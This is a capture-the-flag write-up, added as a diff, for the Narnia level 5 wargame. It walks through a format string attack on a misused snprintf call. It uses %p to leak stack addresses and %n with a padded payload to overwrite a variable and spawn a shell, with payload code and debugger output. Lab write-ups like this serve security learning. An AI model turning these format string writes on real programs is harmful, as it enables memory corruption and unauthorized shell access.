@@ -1,0 +1,78 @@
+Basic String Format exploit
+
+
+The source code takes in argv[1] and writes the output to a buffer using snprintf.
+
+There is also an 'i' value assigned to 1, and if it is assigned to 500 we are granted a shell, how polite.
+
+Fortunately, the snprintf function wasn't used correctly, so we can use format modifiers wherever we'd like inside!
+
+This allows us to leak memory addresses with %p, and to write to addresses using %n!
+
+So what I initially did was create the payload:
+____________________________________________________________________________________________________
+payload = b'AAAA%p'
+print(payload)
+____________________________________________________________________________________________________
+
+
+Which outputs [AAAA0x41414141] in the buffer!
+This means that we can leak stack addresses!
+
+Narnia5 is also kind enough to tell us what the memory address for i is: i = 1 (0xffffd330)
+
+So, if we slide the memory address into the payload between AAAA's and BBBB's, we can easily find where our input ends up on the stack.
+____________________________________________________________________________________________________
+payload = b'AAAA\x30\xd3\xff\xffBBBB' + b'%p'*3
+print(payload)
+____________________________________________________________________________________________________
+
+Checking the stack in pwngdb we get:
+__________________________________________________
+0xffffd278 ◂— 'BBBB0x414141410xffffd3300x42424242'  
+0xffffd27c ◂— '0x414141410xffffd3300x42424242'        << start of our input
+0xffffd280 ◂— '4141410xffffd3300x42424242'
+0xffffd284 ◂— '410xffffd3300x42424242'
+0xffffd288 ◂— 'ffffd3300x42424242'                    << second address that will be returned by %p
+0xffffd28c ◂— 'd3300x42424242'
+0xffffd290 ◂— '0x42424242'
+0xffffd294 ◂— '424242'
+__________________________________________________
+
+As you can see, the second full stack address that will be printed by %p contains the address we want to overwrite
+
+So, if we change the payload to b'AAAA\x30\xd3\xff\xffBBBB' + b'%2$p', it will print out this:
+________________________________________________________________
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [AAAA0BBBB0xffffd330] (22)
+i = 1 (0xffffd330)
+________________________________________________________________
+
+As you can see, the buffer now has %p printing the address holding the value of i!
+
+If we change p to n, something happens:
+________________________________________________________________
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [AAAA0BBBB] (12)
+i = 12 (0xffffd330)
+________________________________________________________________
+
+i's value was changed to 12!!!
+
+Since n writes the number of bytes that have been 'printed' before it is called to the memory address it holds, if we have 500 bytes of input before, i will be set to 500.
+
+Since we only need 488 bytes, we can do this:
+______________________________________________
+payload = b'AAAA\x30\xd3\xff\xffBBBB%488d' + b'%2$n'
+print(payload)
+______________________________________________
+
+
+Adding %488d before the 'writing' bytes works!
+
+Running the payload, we get a shell:
+____________________________________________________________________________________________________
+narnia5@narnia:/tmp/taldgan6$ /narnia/narnia5 $(./payload.py)
+Change i's value from 1 -> 500. GOOD
+$
+____________________________________________________________________________________________________
